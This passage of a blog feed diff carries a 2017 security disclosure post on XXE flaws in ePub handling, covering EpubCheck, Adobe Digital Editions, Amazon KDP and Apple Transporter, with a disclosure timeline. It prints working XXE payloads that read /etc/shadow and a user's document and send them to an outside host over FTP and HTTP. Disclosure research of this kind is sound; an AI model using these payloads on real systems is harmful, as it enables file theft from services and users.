+&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE a [&amp;lt;!ENTITY % b SYSTEM &amp;quot;http://123.123.123.123/dtd&amp;quot;&amp;gt;&lt;/span&gt;%b;%c;]&amp;gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;package&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;version=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;2.0&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;http://www.idpf.org/2007/opf&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;unique-identifier=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;PrimaryID&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;metadata&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:dc=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;http://purl.org/dc/elements/1.1/&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:opf=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;http://www.idpf.org/2007/opf&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;dc:title&amp;gt;&lt;/span&gt;Metamorphosis&lt;span class=&quot;nt&quot;&gt;&amp;lt;/dc:title&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;dc:language&amp;gt;&lt;/span&gt;en&lt;span class=&quot;nt&quot;&gt;&amp;lt;/dc:language&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;dc:identifier&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;PrimaryID&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;opf:scheme=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;URI&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;http://metamorphosiskafka.pressbooks.com&lt;span class=&quot;nt&quot;&gt;&amp;lt;/dc:identifier&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;dc:description&amp;gt;&lt;/span&gt;&lt;span class=&quot;ni&quot;&gt;&amp;amp;send;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/dc:description&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;zip -r book.epub *&lt;/strong&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;Point at a HTTP server to serve the following contents, and specifying a FTP server to recieve the specified file&lt;/strong&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-xml&quot; data-lang=&quot;xml&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY % d SYSTEM &amp;quot;file:///etc/shadow&amp;quot;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY % c &amp;quot;&amp;lt;!ENTITY send SYSTEM &amp;#39;ftp://123.123.123.123/%d;&amp;#39;&amp;gt;&lt;/span&gt;&amp;quot;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;EpubCheck &amp;lt;= 4.0.1&lt;/strong&gt; &lt;/p&gt;
+
+&lt;p&gt;There was a online instance of EpubCheck, that would accept user uploads and perform validation on the format. This provides an example of how this vulnerability could be used to attack online services that support ePub in some way, if they are using a vulnerable version of EpubCheck to validate the uploaded file. &lt;/p&gt;
+
+&lt;p&gt;Uploading our created file:
+&lt;img src=&quot;/assets/epub/upload.png&quot; alt=&quot;Image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;HTTP listener receiving the dtd request when parsed by the remote XML parser, and custom FTP listener receiving the file (I didn’t think it would work, but specified /etc/shadow as the file to retrieve).&lt;br /&gt;
+&lt;img src=&quot;/assets/epub/EPubCheck.png&quot; alt=&quot;Image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This means that we accidentally retrieved the /etc/shadow file. Public facing web apps running as root/system in prod… 😫&lt;/p&gt;
+
+&lt;p&gt;A few examples of other services, and applications I came across that were vulnerable:&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Amazon KDP&lt;/strong&gt; which allows publishers to upload books, was susceptible to XXE when converting books to the Kindle format. 
+&lt;img src=&quot;/assets/epub/AMZ1.png&quot; alt=&quot;Image&quot; /&gt;
+&lt;img src=&quot;/assets/epub/AMZ2.png&quot; alt=&quot;Image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;http://www.adobe.com/solutions/ebook/digital-editions.html&quot;&gt;Adobe Digital Editions&lt;/a&gt; &amp;lt;= 4.5.2&lt;/strong&gt; (book reader) when a user opens a book, this would allow files to be taken from their system. &lt;a href=&quot;https://helpx.adobe.com/security/products/Digital-Editions/apsb16-45.html&quot;&gt;CVE-2016-7889&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;External DTD specifying the file to retrive:&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-xml&quot; data-lang=&quot;xml&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY % d SYSTEM &amp;quot;file:///c:/Users/Documents/secret.txt&amp;quot;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY % c &amp;quot;&amp;lt;!ENTITY send SYSTEM &amp;#39;http://123.123.123.123/exfil/%d;&amp;#39;&amp;gt;&lt;/span&gt;&amp;quot;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;eg., Retriving secret stuff from a users Windows documents folder:
+&lt;img src=&quot;/assets/epub/ADE.png&quot; alt=&quot;Image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Apple Transporter&lt;/strong&gt; (underlying tool used to validate metadata and assets and deliver them to the iTunes Store), &lt;a href=&quot;https://support.apple.com/en-us/HT207432&quot;&gt;CVE-2016-7666&lt;/a&gt;.
+&lt;img src=&quot;/assets/epub/Transporter.png&quot; alt=&quot;Image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://play.google.com/books/uploads&quot;&gt;Google Play Book uploads&lt;/a&gt;&lt;/strong&gt; did not allow external entity processing, but was vulnerable to XML exponential entity expansion &lt;a href=&quot;https://cwe.mitre.org/data/definitions/776.html&quot;&gt;billion laughs&lt;/a&gt;. When uploading a ePub with this pattern, it would spend about 45 minutes trying to process the file before returning an error condition. Google confirmed this on their side.&lt;/p&gt;
+
+&lt;p&gt;There are more things going on with the ePub format beyond the familiar patterns shown here. Some applications will allow Flash to be run, and Javascript execution in the context of the book reader, so you can imagine this can be used to perform some attacks; currently waiting on vendor fixes before talking about this. &lt;/p&gt;
+
+&lt;p&gt;Disclosure timeline stuff:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Sep 2016: Reported XXE in EpubCheck &amp;lt;= 4.0.1.&lt;/li&gt;
+  &lt;li&gt;Sep 2016: Reported XXE in Adobe Digital Editions &amp;lt;= 4.5.2.&lt;/li&gt;
+  &lt;li&gt;Sep 2016: Reported XXE in Amazon KDP.&lt;/li&gt;
+  &lt;li&gt;Oct 2016: Reported XXE in Apple Transporter&lt;/li&gt;
+  &lt;li&gt;Oct 2016: Reported XML exponential entity expansion in play.google.com book uploads.&lt;/li&gt;
+  &lt;li&gt;Dec 2016: Coordinated disclosure.&lt;/li&gt;
+  &lt;li&gt;Jan 2017: This blog post (lots of time for users to patch).&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Thanks to &lt;a href=&quot;http://www.cert.org/&quot;&gt;CERT/CC&lt;/a&gt; for their help in coordinating with different vendors &amp;amp; IDPF, and setting a disclosure timeline. I only tested a handful of digital readers and services, so if you find other vulnerable readers/services, tell CERT/CC (they were tracking the ePubCheck issue as VU#779243).&lt;/p&gt;
+
+&lt;p&gt;If you got this far, thanks for reading. 👋 &lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://twitter.com/craig_arendt&quot;&gt;@craig&lt;/a&gt;&lt;/p&gt;
+</description>
+        <pubDate>Wed, 25 Jan 2017 07:00:00 -0500</pubDate>
+        <link>http://s1gnalcha0s.github.io/epub/2017/01/25/This-book-reads-you.html</link>
+        <guid isPermaLink="true">http://s1gnalcha0s.github.io/epub/2017/01/25/This-book-reads-you.html</guid>
+        
+        
+        <category>epub</category>
+        
+      </item>
     
       <item>
         <title>SSJS Web Shell Injection</title>
